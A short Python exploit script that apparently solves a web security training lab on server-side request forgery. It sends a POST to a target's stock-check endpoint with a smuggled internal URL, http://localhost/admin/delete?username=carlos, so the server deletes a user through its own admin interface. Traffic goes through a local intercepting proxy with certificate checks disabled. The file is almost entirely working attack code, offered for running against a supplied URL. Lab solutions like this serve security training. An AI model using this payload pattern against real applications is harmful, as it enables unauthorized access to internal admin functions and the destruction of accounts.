import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def delete_user(url):
    stock_url = url + '/product/stock'
    params = {
        'stockApi' : 'http://localhost/admin/delete?username=carlos'
    }
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 401:
        print("[-] Something went wrong, redirect to /admin not received")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Basic SSRF against the local server")
    print("""[+] This lab has a stock check feature which fetches data from an internal system.
    To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.""")
    
    delete_user(url)


if __name__ == "__main__":
    main()